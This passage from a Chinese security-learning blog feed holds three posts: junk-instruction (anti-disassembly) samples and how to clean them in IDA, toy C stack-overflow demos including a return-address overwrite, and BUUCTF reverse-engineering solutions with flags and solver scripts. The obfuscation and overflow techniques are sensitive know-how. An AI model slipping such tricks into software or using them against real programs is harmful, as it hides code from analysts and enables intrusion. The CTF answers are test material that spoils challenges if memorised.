??????就相当于跳转指令</code></pre><p>而现在IDA采用线性扫描，就是一个个读取机器码，或者读取几个机器码然后输出其对应的汇编指令。现在思考，如果我向一串机器码中插入一个垃圾机器码，是不是IDA就可能输出错误的汇编代码，导致反编译失败。而这些垃圾机器码就是我们加上的花指令。</p><p>4.添加花指令原则：</p><p>(1)一定不会影响整个程序的运作。</p><p>(2)构造永恒跳转，添加垃圾数据！</p><h2 id="二、一些准备工作"><a href="#二、一些准备工作" class="headerlink" title="二、一些准备工作"></a>二、一些准备工作</h2><p>1.什么是内敛汇编</p><pre><code>_asm&#123;    push ebp    mov ebp,esp    sub esp,3D&#125;</code></pre><p>大括号里面就用来写汇编代码。</p><p>2._emit 立即数</p><pre><code>_emit e8_emit c3</code></pre><p>这个就是用来插入垃圾代码的。</p><p>3.一些IDA的功能使用</p><p>(1)查看机器码和栈顶指针<br><img src="https://i.loli.net/2020/12/15/NHMO8FenLVTumEq.png"></p><p><img src="https://i.loli.net/2020/12/15/yBtDpjLolI5FvKs.png"><br>(2)改机器码或者栈顶，这个就调试的时候在介绍了。</p><p>(3)d键，c键，p键，这个也在调试的时候说了。</p><h2 id="三、开始调试各种含有花指令的文件"><a href="#三、开始调试各种含有花指令的文件" class="headerlink" title="三、开始调试各种含有花指令的文件"></a>三、开始调试各种含有花指令的文件</h2><h3 id="1-样本1"><a href="#1-样本1" class="headerlink" title="1.样本1"></a>1.样本1</h3><h4 id="源代码如下"><a href="#源代码如下" class="headerlink" title="源代码如下"></a>源代码如下</h4><pre><code>#include&lt;stdio.h&gt;#include&lt;windows.h&gt;int main()&#123;    printf(&quot;hello!&quot;);    __asm &#123;        xor eax,eax        test eax,eax         je LABEL1         jne LABEL2LABEL2:           _emit 0x5e        and eax,ebx        _emit 0x50        xor eax,ebx        _emit 0x74        add eax,edxLABEL1:    &#125;    printf(&quot;world&quot;);    return 0;&#125;</code></pre><h4 id="放到IDA里面分析。"><a href="#放到IDA里面分析。" class="headerlink" title="放到IDA里面分析。"></a>放到IDA里面分析。</h4><p><img src="https://i.loli.net/2020/12/18/J1oiQFWD7Eh3Su5.png"><br>按d键后。<br><img src="https://i.loli.net/2020/12/18/XHucFKdjAwpntTo.png"><br>nop机器码，圈住机器码的开头然后点击Edit—Patch program—change byte<br><img src="https://i.loli.net/2020/12/18/QgKphGIAjD3BH15.png"><br>注意还要，将原来d键后的位置，按c键重新分析一下，才能在函数开头按p键。</p><p>去花后<br><img src="https://i.loli.net/2020/12/18/eFRVnzWsPCfBODN.png"></p><h3 id="2-样本2"><a href="#2-样本2" class="headerlink" title="2.样本2"></a>2.样本2</h3><h4 id="源代码如下-1"><a href="#源代码如下-1" class="headerlink" title="源代码如下"></a>源代码如下</h4><pre><code>#include&lt;stdio.h&gt;int main(void)&#123;    int a=1;    printf(&quot;hello &quot;);    if(a==0)    &#123;        _asm        &#123;            _emit 0xe8;            _emit 0xc3;        &#125;    &#125;    else    printf(&quot;world&quot;);    return 0;&#125;</code></pre><h4 id="调试过程如下"><a href="#调试过程如下" class="headerlink" title="调试过程如下"></a>调试过程如下</h4><p>按了d键，c键展开，重新布局之后<br><img src="https://i.loli.net/2020/12/19/W16fiA4h7kCN5EQ.png"><br>nop后，按p键，就可以f5看伪代码了。<br><img src="https://i.loli.net/2020/12/19/h2ukeyPOxQ981rb.png"></p><h3 id="3-样本3"><a href="#3-样本3" class="headerlink" title="3.样本3"></a>3.样本3</h3><h4 id="源代码如下-2"><a href="#源代码如下-2" class="headerlink" title="源代码如下"></a>源代码如下</h4><pre><code>#include&lt;stdio.h&gt;#include&lt;windows.h&gt;int a=1;int main()&#123;    printf(&quot;hello!&quot;);        __asm &#123;        push eax;        xor eax, eax;        test eax, eax;        jnz  LABEL1;        jz LABEL2;    LABEL1:        _emit 0xE8;    LABEL2:        mov byte ptr[a], 0;        call LABEL3;        _emit 0xFF;    LABEL3:        add dword ptr ss : [esp] , 8;//这里的8是经过调试而得，使执行ret指令时正好到达mov byte ptr[a], 2;，而掩盖_emit 0xFF;__emit 0x11;这两个垃圾值。        ret;        __emit 0x11;        mov byte ptr[a], 2;        pop eax;    &#125;    printf(&quot;world&quot;);    return 0;&#125;</code></pre><h4 id="调试过程"><a href="#调试过程" class="headerlink" title="调试过程"></a>调试过程</h4><p>看机器码<br><img src="https://i.loli.net/2020/12/18/nsJwVmMWO1vL75a.png"><br>然后用d键和c键使整个逻辑看起来清晰一些。这个过程可以用另一个软件dbg来看一些垃圾代码，因为在dbg里面每执行一步就可以看到正确的语句，就可以看到正确的机器码，然后挑出垃圾代码。<br><img src="https://i.loli.net/2020/12/19/U2hMTCBqLpJdW1v.png"><br>然后c键重新分析，然后p键，发现下半段会有个sp-analysis failed<br><img src="https://i.loli.net/2020/12/19/Ci14BjLR7YrWzup.png"><br>既然这样就直接把那个call loc_40104C后面一部分全部nop了，也不会对整个流程产生影响。<br><img src="https://i.loli.net/2020/12/19/z8qSJkwuxU5KVNc.png"><br>然后p键，就发现可以f5看伪代码了。<br><img src="https://i.loli.net/2020/12/19/eNPWwTXOKQkqjD9.png"></p>]]></content>
      
      
      <categories>
          
          <category> Reverse </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 花指令 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>栈溢出</title>
      <link href="2020/12/08/%E6%A0%88%E6%BA%A2%E5%87%BA/"/>
      <url>2020/12/08/%E6%A0%88%E6%BA%A2%E5%87%BA/</url>
      
        <content type="html"><![CDATA[<h2 id="栈溢出小例子"><a href="#栈溢出小例子" class="headerlink" title="栈溢出小例子"></a>栈溢出小例子</h2><h3 id="样例1"><a href="#样例1" class="headerlink" title="样例1"></a>样例1</h3><p>其c代码如下，在vc6++中编译</p><pre><code>#include&lt;stdio.h&gt;void Fun()&#123;    int i;    int arr[5] = &#123;0,1,2,3,4&#125;;//数组的长度为5    for( i=0 ; i&lt;=5 ;i++)//循环次数为6，按道理应该只会输出6个Hello Word    &#123;        arr[i]=0;        printf(&quot;Hello Word\n&quot;);    &#125;&#125;int main()&#123;    Fun();    return 0;    &#125;</code></pre><p>运行结果会是一直输出Hello Word，实际上就是发生了栈溢出。</p><h3 id="通过调试来分析怎么回事"><a href="#通过调试来分析怎么回事" class="headerlink" title="通过调试来分析怎么回事"></a>通过调试来分析怎么回事</h3><p>先找到主函数，如下。</p><p><img src="https://i.loli.net/2020/12/07/mwVE57vbPCazxUp.png"></p><p>进入fun函数<br><img src="https://i.loli.net/2020/12/07/tJfLW2EhjXUqK6D.png"><br>注意这两句，ecx中的值实际上也是i,只是ebp-4的位置的值给了ecx寄存器。实际上就是，通过ecx的改变来将这个0给a[i]。</p><pre><code>mov ecx,dword ptr ss:[ebp-4]mov dword ptr ss:[ebp+ecx*4-18],0</code></pre><p>开始调试，一步步f8，进行第1步循环。<br><img src="https://i.loli.net/2020/12/07/SwYzag6HR32MZsP.png"><br>进行第2步循环<br><img src="https://i.loli.net/2020/12/07/UASLlnB2ZJhDPpu.png"><br>第3,4,5循环都和前面一样，现在主要看第6次循环<br><img src="https://i.loli.net/2020/12/07/KRnFTOoqch2XEUZ.png"><br>注意灰色的这一句<br>    mov dword ptr ss:[ebp+ecx<em>4-18],0<br>现在ecx已经是5了，所以ss:[ebp+ecx</em>4-18]=ss:[ebp-4]，然后它把0给了这个位置，意味着i将变为0。简单来说就是在第6次循环中，a[5]的地址和i的地址重复了，本来是改a[5],却把i的值改为了0(但根本还是因为原来定义a[5]={0,1,2,3,4}只定义了5个长度)。</p><p>执行完之后<br><img src="https://i.loli.net/2020/12/07/AyjhJ3bMDwOtqWT.png"><br>这样就会造成一个无线循环的结果，因为没次ecx=5(也就是i=5时)，都会因为a[5]的地址和i的地址重复了这个原因，导致i又变为0，永远i都不能满足i&gt;5这个条件而跳出循环，所以会一直输出hello word。</p><h4 id="如果感觉有兴趣的话还可以，尝试改一改原代码的一些内容"><a href="#如果感觉有兴趣的话还可以，尝试改一改原代码的一些内容" class="headerlink" title="如果感觉有兴趣的话还可以，尝试改一改原代码的一些内容"></a>如果感觉有兴趣的话还可以，尝试改一改原代码的一些内容</h4><pre><code>#include&lt;stdio.h&gt;void Fun()&#123;    int i;    int arr[5] = &#123;0,1,2,3,4&#125;;    for( i=0 ; i&lt;=5 ;i++)    &#123;        arr[i]=0;//将这个0分别改为0,1,2,3,4,5        printf(&quot;Hello Word\n&quot;);    &#125;&#125;int main()&#123;    Fun();    return 0;    &#125;</code></pre><p>会发现当a[i]=分别是0,1,2,3,4时都会发生栈溢出，无限输出hello world，只是调试时栈窗口中i地址(也就是ebp-4)中的值的变化范围会改变(但是第1轮都一样都是0~5)，当然先前定义的数组的值也会变。改变如下</p><pre><code>如果是0，将会是0-1-2-3-4-5-0-1-2-3-4-5-0-1-2-3-4-5-0-1-2....如果是1，将会是0-1-2-3-4-5-1-2-3-4-5-1-2-3-4-5-1-2-3-4-5-1....如果是2，将会是0-1-2-3-4-5-2-3-4-5-2-3-4-5-2-3-4-5....如果是3，将会是0-1-2-3-4-5-3-4-5-3-4-5-3-4-5-3-4-5....如果是4，将会是0-1-2-3-4-5-4-5-4-5-4-5-4-5-4-5-4-5....</code></pre><p>而当让a[i]=5时，则将会是有限次循环(循环6次)，放一张图片，就只看第6次循环<br><img src="https://i.loli.net/2020/12/07/n8escCaEJFAGSX4.png"><br>实际上还是发生了栈溢出的。</p><h4 id="再改改for循环的条件"><a href="#再改改for循环的条件" class="headerlink" title="再改改for循环的条件"></a>再改改for循环的条件</h4><pre><code>#include&lt;stdio.h&gt;void Fun()&#123;    int i;    int arr[5] = &#123;0,1,2,3,4&#125;;    for( i=0 ; i&lt;=7 ;i++)//将i&lt;=5改为i&lt;=7    &#123;        arr[i]=5;//注意这里是5，避免一直循环，如果改为6或者7的话实际上会影响循环次数，具体为什么就自己亲自去调试看看吧。        printf(&quot;Hello Word\n&quot;);    &#125;&#125;int main()&#123;    Fun();    return 0;    &#125;</code></pre><p>看看执行后的结果<br><img src="https://i.loli.net/2020/12/08/sF7PkEHp64ciB2X.png"><br>欸，怎么少了一行字</p><pre><code>Press any key to continue</code></pre><p>调试看看。</p><p>实际上前5次都算正常，第6次也还行，第7次和第8次存在严重的问题。</p><p>第7次循环内部<br><img src="https://i.loli.net/2020/12/08/eRcZW2rPMwN3ah9.png"><br>执行完这一条指令后，ebp改变<br><img src="https://i.loli.net/2020/12/08/1yhNGFJ5AuZwPca.png"><br>第8次循环内部<br><img src="https://i.loli.net/2020/12/08/ycwGzTMAEaYjbkv.png"><br>执行完这一条指令后，返回原函数的地址改变<br><img src="https://i.loli.net/2020/12/08/7hYIOfUZiwyN1Dx.png"><br>ebp变了，返回原函数的地址改变，所以这个子函数的那个ret指令，根本就没用了，所以不能回到原函数。</p><h3 id="样例2"><a href="#样例2" class="headerlink" title="样例2"></a>样例2</h3><p>c代码如下，在vc6++中编译</p><pre><code>#include&lt;stdio.h&gt;//基于缓冲区溢出的HelloWordvoid HelloWord()&#123;    printf(&quot;Hello World&quot;);&#125;void Fun()&#123;    int arr[5] = &#123;1,2,3,4,5&#125;;    arr[6] = (int) HelloWord;//注意这里是a[6]，在后面调试过程中会发现这个地址存储着主函数的返回地址。这也是为什么不是a[5]的原因，a[5]所在位置实际上存的是原ebp的值。&#125;int main()&#123;    Fun();    return 0;&#125;</code></pre><p>这一句</p><pre><code>arr[6] = (int) HelloWord</code></pre><p>如果arr[6]改为arr[5]编译会过但是执行时会出错。</p><p>如果是arr[6]的话最终执行结果如下<br><img src="https://i.loli.net/2020/12/08/ty6dxJ9AfD3a7Ku.png"><br>为什么会有hello world，但是却没有</p><pre><code>Press any key to continue</code></pre><h3 id="通过调试来看看"><a href="#通过调试来看看" class="headerlink" title="通过调试来看看"></a>通过调试来看看</h3><p>找到mian函数<br><img src="https://i.loli.net/2020/12/08/tbzvA7OfNaBULuP.png"><br>进入fun函数<br><img src="https://i.loli.net/2020/12/08/jTn1b983iryUswa.png"><br>执行这一句之后</p><pre><code>mov dword ptr ss:[ebp+4],缓冲区溢出.40100F//也就是arr[6] = (int) HelloWord;</code></pre><p><img src="https://i.loli.net/2020/12/08/HlXchoUNM9wKi6S.png"><br>进入Hello world函数<br><img src="https://i.loli.net/2020/12/08/KWV3h9uy7wkCvPr.png"><br>输出Hello world后<br><img src="https://i.loli.net/2020/12/08/RIUVTQLoNxh61De.png"><br>看看ret指令执行会到哪里<br><img src="https://i.loli.net/2020/12/08/9w2s1VMKWNTanZg.png"><br>会发现到了开始的EP处，而实际上如果没有发生缓冲区溢出，在fun函数内部的ret指令执行后，就会到达这个位置。<br><img src="https://i.loli.net/2020/12/08/ewYBF4PGLirQXTI.png"><br>然后实际上还可以继续调试，会发现又会输出一个hello world,然后到某个位置停下，在这里就不继续调试。</p>]]></content>
      
      
      <categories>
          
          <category> Pwn </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>buuCTF的wp</title>
      <link href="2020/12/02/buuctf%E7%9A%84wp/"/>
      <url>2020/12/02/buuctf%E7%9A%84wp/</url>
      
        <content type="html"><![CDATA[<h1 id="buuCTF的wp"><a href="#buuCTF的wp" class="headerlink" title="buuCTF的wp"></a>buuCTF的wp</h1><p>前言，主要是re方向的题，应该会持续更新，更新时间不定</p><h2 id="re方向"><a href="#re方向" class="headerlink" title="re方向"></a>re方向</h2><h3 id="1-easyre"><a href="#1-easyre" class="headerlink" title="1.easyre"></a>1.easyre</h3><p>签到题，直接用ida打开，shift+12查看字符串，如下</p><p><img src="https://i.loli.net/2020/12/01/qDwBnOEH59uTRzc.png"></p><p>得到flag：flag{this_Is_a_EaSyRe}</p><h3 id="2-reverse1"><a href="#2-reverse1" class="headerlink" title="2.reverse1"></a>2.reverse1</h3><p>f5看关键代码如下</p><pre><code>  sub_1400111D1(&quot;input the flag:&quot;);  sub_14001128F(&quot;%20s&quot;, &amp;Str1);  v3 = j_strlen(Str2);  if ( !strncmp(&amp;Str1, Str2, v3) )//意思是输入的flag是str1，当str1和str2相等是就是正确的    sub_1400111D1(&quot;this is the right flag!\n&quot;);  else    sub_1400111D1(&quot;wrong flag\n&quot;);  sub_14001113B(&amp;v5, &amp;unk_140019D00);  return 0i64;</code></pre><p>str2点开是{hello_world}，然后上面有个点是要把o改为0，所以flag：flag{hell0_w0rld}</p><h3 id="3-reverse2"><a href="#3-reverse2" class="headerlink" title="3.reverse2"></a>3.reverse2</h3><p>打开IDA，F5看关键代码。<br><img src="https://i.loli.net/2020/12/01/sm2Dlgq7XhEiAQT.png"><br>将圈出来的代码用R键，得到<br><img src="https://i.loli.net/2020/12/01/HydgV5OGMrB6a9i.png"><br>图片中说错了，应该是要把flag中的i和r改为1</p><p>点开&amp;flag，得到关键代码</p><pre><code>.data:0000000000601080 flag            db &#39;&#123;&#39;//这个&#123;也要用R键才看得到                  ; DATA XREF: main+34↑r.data:0000000000601080                                         ; main+44↑r ....data:0000000000601081 aHackingForFun  db &#39;hacking_for_fun&#125;&#39;,0.data:0000000000601081 _data           ends</code></pre><p>flag中的i和r改为1，最后得到flag：flag{hack1ng_fo1_fun}</p><h3 id="4-内涵的软件"><a href="#4-内涵的软件" class="headerlink" title="4.内涵的软件"></a>4.内涵的软件</h3><p>根据提示可能是一个upx加壳的软件，用PEID打开<br>直接IDA打开查看字符串，得到flag：flag{49d3c93df25caad81232130f3d2ebfad}</p><h3 id="5-新年快乐"><a href="#5-新年快乐" class="headerlink" title="5.新年快乐"></a>5.新年快乐</h3><p>用ida打开什么也没有，用PEID打开<br><img src="https://i.loli.net/2020/12/01/4OUJFh1BGS5xaXP.png"><br>发现是个upx加壳的东西，用upx解壳，将upx.exe和该文件一起放在D盘下，再在cmd里面执行命令。<br><img src="https://i.loli.net/2020/12/01/xRlQrDfWP3jB19N.png"><br>原来21kb的文件变成了28kb，再用ida打开，得到重要代码</p><pre><code>int __cdecl main(int argc, const char **argv, const char **envp)&#123;  int result; // eax  char Str2; // [esp+12h] [ebp-3Ah]  char Str1[2]; // [esp+20h] [ebp-2Ch]  char v6; // [esp+22h] [ebp-2Ah]  __main();  strcpy(&amp;Str2, &quot;HappyNewYear!&quot;);  *(_WORD *)Str1 = 0;  memset(&amp;v6, 0, 0x1Eu);  printf(&quot;please input the true flag:&quot;);  scanf(&quot;%s&quot;, Str1);  if ( !strncmp(Str1, &amp;Str2, strlen(&amp;Str2)) )//str1是输入的flag，这个str1要和str2相等    result = puts(&quot;this is true flag!&quot;);  else    result = puts(&quot;wrong!&quot;);  return result;&#125;</code></pre><p>所以flag就是：flag{HappyNewYear!}</p><h3 id="6-BJDCTF-2nd-guessgame"><a href="#6-BJDCTF-2nd-guessgame" class="headerlink" title="6.[BJDCTF 2nd]guessgame"></a>6.[BJDCTF 2nd]guessgame</h3><p>ida打开，得到flag：BJD{S1mple_ReV3r5e_W1th_0D_0r_IDA}</p><h3 id="7-helloword"><a href="#7-helloword" class="headerlink" title="7.helloword"></a>7.helloword</h3><p>下载下来发现是个apk文件，直接解压，得到几个文件<br><img src="https://i.loli.net/2020/12/02/5SVUNYab2XzFgyp.png"><br>可以把那个文件后缀名直接改txt，然后搜索flag，也可以用jeb软件打开，然后搜索字符串得到<br>flag{7631a988259a00816deda84afb29430a}</p><h3 id="8-xor"><a href="#8-xor" class="headerlink" title="8.xor"></a>8.xor</h3><p>考点 数组内异或</p><p>ida打开，找到主要函数</p><pre><code>int __cdecl main(int argc, const char **argv, const char **envp)&#123;  char *v3; // rsi  int result; // eax  signed int i; // [rsp+2Ch] [rbp-124h]  char v6[264]; // [rsp+40h] [rbp-110h]  __int64 v7; // [rsp+148h] [rbp-8h]  memset(v6, 0, 0x100uLL);  v3 = (char *)256;  printf(&quot;Input your flag:\n&quot;, 0LL);  get_line(v6, 256LL);//v6是输入的flag  if ( strlen(v6) != 33 )//输入的flag长度为33    goto LABEL_12;  for ( i = 1; i &lt; 33; ++i )    v6[i] ^= v6[i - 1];         //数组异或，可以自己举三个数，然后进行异或，然后在看看怎么异或回去。  v3 = global;  if ( !strncmp(v6, global, 0x21uLL) ) //global要和异或v6相等，要自己去找global的值。    printf(&quot;Success&quot;, v3);  elseLABEL_12:    printf(&quot;Failed&quot;, v3);  result = __stack_chk_guard;  if ( __stack_chk_guard == v7 )    result = 0;  return result;&#125;</code></pre><p>global为f\nk\fw&amp;O.@\x11x\rZ;U\x11p\x19F\x1Fv&quot;M#D\x0Eg\x06h\x0FG2O，可以在Python中用list改善一下’f’, ‘\n’, ‘k’, ‘\x0c’, ‘w’, ‘&amp;’, ‘O’, ‘.’, ‘@’, ‘\x11’, ‘x’, ‘\r’, ‘Z’, ‘;’, ‘U’, ‘\x11’, ‘p’, ‘\x19’, ‘F’, ‘\x1f’, ‘v’, ‘“‘, ‘M’, ‘#’, ‘D’, ‘\x0e’, ‘g’, ‘\x06’, ‘h’, ‘\x0f’, ‘G’, ‘2’, ‘O’</p><p>开始写脚本</p><pre><code>#include&lt;stdio.h&gt;int main(void)&#123;    int i;    char a[]=&#123;&#39;f&#39;, &#39;\n&#39;, &#39;k&#39;, &#39;\x0c&#39;, &#39;w&#39;, &#39;&amp;&#39;, &#39;O&#39;, &#39;.&#39;, &#39;@&#39;, &#39;\x11&#39;, &#39;x&#39;, &#39;\r&#39;, &#39;Z&#39;, &#39;;&#39;, &#39;U&#39;, &#39;\x11&#39;, &#39;p&#39;, &#39;\x19&#39;, &#39;F&#39;, &#39;\x1f&#39;, &#39;v&#39;, &#39;&quot;&#39;, &#39;M&#39;, &#39;#&#39;, &#39;D&#39;, &#39;\x0e&#39;, &#39;g&#39;, &#39;\x06&#39;, &#39;h&#39;, &#39;\x0f&#39;, &#39;G&#39;, &#39;2&#39;, &#39;O&#39;&#125;;    for(i=32;i!=0;i--)    &#123;        a[i]=a[i]^a[i-1];     &#125;     for(i=0;i&lt;33;i++)    &#123;        printf(&quot;%c&quot;,a[i]);    &#125; &#125; </code></pre><p>得到flag{QianQiuWanDai_YiTongJiangHu}</p><h3 id="9-reverse3"><a href="#9-reverse3" class="headerlink" title="9.reverse3"></a>9.reverse3</h3><p>用ida打开，找到主要函数</p><pre><code>  int v3; // edx  __int64 v4; // ST08_8  signed int j; // [esp+DCh] [ebp-ACh]  signed int i; // [esp+E8h] [ebp-A0h]  signed int v8; // [esp+E8h] [ebp-A0h]  char Dest[108]; // [esp+F4h] [ebp-94h]  char Str; // [esp+160h] [ebp-28h]  char v11; // [esp+17Ch] [ebp-Ch]  for ( i = 0; i &lt; 100; ++i )  &#123;    if ( (unsigned int)i &gt;= 0x64 )      j____report_rangecheckfailure();    Dest[i] = 0;  &#125;  sub_41132F(&quot;please enter the flag:&quot;);  sub_411375(&quot;%20s&quot;, &amp;Str);//输入的flag  v0 = j_strlen(&amp;Str);  v1 = (const char *)sub_4110BE(&amp;Str, v0, &amp;v11);//对输入的flag进行了没有改表的base编码，可以直接用网上在线base64解码。  strncpy(Dest, v1, 0x28u);//将v1给了Dest  v8 = j_strlen(Dest);  for ( j = 0; j &lt; v8; ++j )//对Dest进行了一个简单加密。    Dest[j] += j;  v2 = j_strlen(Dest);  if ( !strncmp(Dest, Str2, v2) )//将Dest和str2比较，就是要一样    sub_41132F(&quot;rigth flag!\n&quot;);  else    sub_41132F(&quot;wrong flag!\n&quot;);  HIDWORD(v4) = v3;  LODWORD(v4) = 0;  return v4;&#125;</code></pre><p>先找到str2=‘e3nifIH9b_C@n@dH’，用这个来得到，解密后的Dest，脚本如下</p><pre><code>#include&lt;stdio.h&gt;int main(void)&#123;    char a[]=&#123;&#39;e&#39;, &#39;3&#39;, &#39;n&#39;, &#39;i&#39;, &#39;f&#39;, &#39;I&#39;, &#39;H&#39;, &#39;9&#39;, &#39;b&#39;, &#39;_&#39;, &#39;C&#39;, &#39;@&#39;, &#39;n&#39;, &#39;@&#39;, &#39;d&#39;, &#39;H&#39;&#125;;    int i;    for(i=0;i&lt;16;i++)    &#123;        a[i]=a[i]-i;     &#125;     for(i=0;i&lt;16;i++)    &#123;        printf(&quot;%c&quot;,a[i]);    &#125;&#125;</code></pre><p>得到Dest=‘e2lfbDB2ZV95b3V9’，由于是未改表的base编码，所以可以直接用网上在线解码，得到flag{i_l0ve_you}</p><h3 id="10-不一样的flag"><a href="#10-不一样的flag" class="headerlink" title="10.不一样的flag"></a>10.不一样的flag</h3><p>考点，迷宫题。</p><p>直接打开，叫你输入1，2,3,4，分别代表上下左右。<br><img src="https://i.loli.net/2020/12/02/nQgbhIyUVGR1aJH.png"><br>有耐心的话可以一次一次试，只要输入对了，就会继续你输入，直到无论你输入那个数都是直接退出，将输入的数组合起来就是flag。</p><p>用ida查看源代码。</p><pre><code>int __cdecl __noreturn main(int argc, const char **argv, const char **envp)&#123;  char v3; // [esp+17h] [ebp-35h]  int v4; // [esp+30h] [ebp-1Ch]  int v5; // [esp+34h] [ebp-18h]  int v6; // [esp+38h] [ebp-14h]  int i; // [esp+3Ch] [ebp-10h]  char v8[12]; // [esp+40h] [ebp-Ch]  __main();  v4 = 0;  v5 = 0;  qmemcpy(&amp;v3, _data_start__, 0x19u);  while ( 1 )  &#123;    puts(&quot;you can choose one action to execute&quot;);    puts(&quot;1 up&quot;);    puts(&quot;2 down&quot;);    puts(&quot;3 left&quot;);    printf(&quot;4 right\n:&quot;);    scanf(&quot;%d&quot;, &amp;v6);//你输入的数，也就是flag    ————————————————————————————————————————————————    if ( v6 == 2 )    &#123;      ++v4;    &#125;    else if ( v6 &gt; 2 )    &#123;      if ( v6 == 3 )      &#123;        --v5;      &#125;      else      &#123;        if ( v6 != 4 )LABEL_13:          exit(1);        ++v5;      &#125;    &#125;    else    &#123;      if ( v6 != 1 )        goto LABEL_13;      --v4;    &#125;    for ( i = 0; i &lt;= 1; ++i )    &#123;      if ( *(&amp;v4 + i) &lt; 0 || *(&amp;v4 + i) &gt; 4 )        exit(1);    &#125;    if ( v8[5 * v4 - 41 + v5] == 49 )      exit(1);    if ( v8[5 * v4 - 41 + v5] == 35 )    &#123;      puts(&quot;\nok, the order you enter is the flag!&quot;);      exit(0);    &#125;//这一整段就是要通过你输入的一个个数字，使最后一个if调键满足，那个35实际上就是‘#’，也就是迷宫的终点，而49就是迷宫中的‘1’，不能碰到。——————————————————————————————————————————————————————————  &#125;&#125;</code></pre><p>真正的迷宫在字符串中</p><pre><code>&#39;*11110100001010000101111#&#39;//25个数，盲猜5*5</code></pre><p>用脚本画出迷宫</p><pre><code>#include&lt;stdio.h&gt;int main(void)&#123;    int a[5][5]=&#123;&#39;*&#39;, &#39;1&#39;, &#39;1&#39;, &#39;1&#39;, &#39;1&#39;, &#39;0&#39;, &#39;1&#39;, &#39;0&#39;, &#39;0&#39;, &#39;0&#39;, &#39;0&#39;, &#39;1&#39;, &#39;0&#39;, &#39;1&#39;, &#39;0&#39;, &#39;0&#39;, &#39;0&#39;, &#39;0&#39;, &#39;1&#39;, &#39;0&#39;, &#39;1&#39;, &#39;1&#39;, &#39;1&#39;, &#39;1&#39;, &#39;#&#39;&#125;;    int i,j;    for(i=0;i&lt;5;i++)    &#123;        for(j=0;j&lt;5;j++)        &#123;        printf(&quot;%c&quot;,a[i][j]);        &#125;        printf(&quot;\n&quot;);    &#125;     &#125; </code></pre><p>得到迷宫</p><pre><code>*11110100001010000101111#</code></pre><p>根据1，2,3,4四个反向得到flag{222441144222}</p><h3 id="11-SimpleRev"><a href="#11-SimpleRev" class="headerlink" title="11.SimpleRev"></a>11.SimpleRev</h3><p>关键代码如下，要熟悉ascall码表中A<del>Z,a</del>z的十进制数</p><pre><code>unsigned __int64 Decry()&#123;  char v1; // [rsp+Fh] [rbp-51h]  int v2; // [rsp+10h] [rbp-50h]  int v3; // [rsp+14h] [rbp-4Ch]  int i; // [rsp+18h] [rbp-48h]  int v5; // [rsp+1Ch] [rbp-44h]  char src[8]; // [rsp+20h] [rbp-40h]  __int64 v7; // [rsp+28h] [rbp-38h]  int v8; // [rsp+30h] [rbp-30h]  __int64 v9; // [rsp+40h] [rbp-20h]  __int64 v10; // [rsp+48h] [rbp-18h]  int v11; // [rsp+50h] [rbp-10h]  unsigned __int64 v12; // [rsp+58h] [rbp-8h]  v12 = __readfsqword(0x28u);  *(_QWORD *)src = 357761762382LL;//src=&#39;SLCDN&#39;  v7 = 0LL;  v8 = 0;  v9 = 512969957736LL;//v9=&#39;wodah&#39;  v10 = 0LL;  v11 = 0;  text = (char *)join(key3, &amp;v9);// key3=&#39;kills&#39;    test=key3+v9=‘killshadow’    strcpy(key, key1);// Key1=&#39;ADSFK&#39;  strcat(key, src);//Key=&#39;ADSFKNDCLS&#39;   注意要倒过来  v2 = 0;  v3 = 0;  getchar();  v5 = strlen(key);  for ( i = 0; i &lt; v5; ++i )  &#123;    if ( key[v3 % v5] &gt; 64 &amp;&amp; key[v3 % v5] &lt;= 90 )      key[i] = key[v3 % v5] + 32;    ++v3;  &#125;//将key全部换为小写。  printf(&quot;Please input your flag:&quot;, src);  while ( 1 )  &#123;    v1 = getchar();//V1就是输入的flag，根据下面的if条件只能算出v1的范围为64~90,97~122，涉及到下面%求余的整数部分的问题。    if ( v1 == 10 )      break;    if ( v1 == 32 )    &#123;      ++v2;    &#125;    else    &#123;      if ( v1 &lt;= 96 || v1 &gt; 122 )      &#123;        if ( v1 &gt; 64 &amp;&amp; v1 &lt;= 90 )          str2[v2] = (v1 - 39 - key[v3++ % v5] + 97) % 26 + 97;//加密语句      &#125;      else      &#123;        str2[v2] = (v1 - 39 - key[v3++ % v5] + 97) % 26 + 97;      &#125;      if ( !(v3 % v5) )        putchar(32);      ++v2;    &#125;  &#125;  if ( !strcmp(text, str2) )//要求text=str2    puts(&quot;Congratulation!\n&quot;);  else    puts(&quot;Try again!\n&quot;);  return __readfsqword(0x28u) ^ v12;&#125;</code></pre><p>感觉这道题有点问题，v1的范围有点没确定好，也可能是我忽略了某个地方。</p><p>脚本如下</p><pre><code>#include&lt;stdio.h&gt;int main(void)&#123;    char a[11]=&quot;ADSFKNDCLS&quot;;    char b[11]=&quot;killshadow&quot;;    char c[11]=&quot;\0&quot;;    int i=0,j=0;    for(i=0;i&lt;11;i++,j++)    &#123;        if( a[j % 11] &gt; 64 &amp;&amp; a[j % 11] &lt;= 90)            a[i] = a[j % 10] + 32;//这个里面的j%11实际上就相当于i，只是在ida中打开变了样子。        printf(&quot;%c&quot;,a[i]);    &#125;    printf(&quot;\n&quot;);    for(i=0;i&lt;10;i++)    &#123;        c[i]=(b[i]-97)+26+39-97+a[i];//因为不知道原加密语句求余的那个整数是多少所以只加了一个26，         if(c[i]&gt;90)        &#123;            c[i]=c[i]-26;        &#125;//加上这个主要是要所有字母都是大写的，不然会有乱码         printf(&quot;%c&quot;,c[i]);    &#125;&#125;</code></pre><h3 id="12-BJDCTF-2nd-8086"><a href="#12-BJDCTF-2nd-8086" class="headerlink" title="12.[BJDCTF 2nd]8086"></a>12.[BJDCTF 2nd]8086</h3><p>根据文件名字，得知应该这是8086的32位汇编。</p><p>用ida打开，shift+12打开字符串，发现只有一句点进去，得到<br><img src="https://i.loli.net/2020/12/04/8Y4HGznopkUrJ6N.png"><br>查看重要代码如下<br><img src="https://i.loli.net/2020/12/04/bCYGyJsphdlPa42.png"><br>根据这个分析开始写脚本，如下</p><pre><code>#include&lt;stdio.h&gt;int main(void)&#123;    int i;    char a[]=&#123;&#39;]&#39;, &#39;U&#39;, &#39;[&#39;, &#39;d&#39;, &#39;u&#39;, &#39;~&#39;, &#39;|&#39;, &#39;t&#39;, &#39;@&#39;, &#39;&#123;&#39;, &#39;z&#39;, &#39;@&#39;, &#39;w&#39;, &#39;j&#39;, &#39;.&#39;, &#39;&#125;&#39;, &#39;.&#39;, &#39;~&#39;, 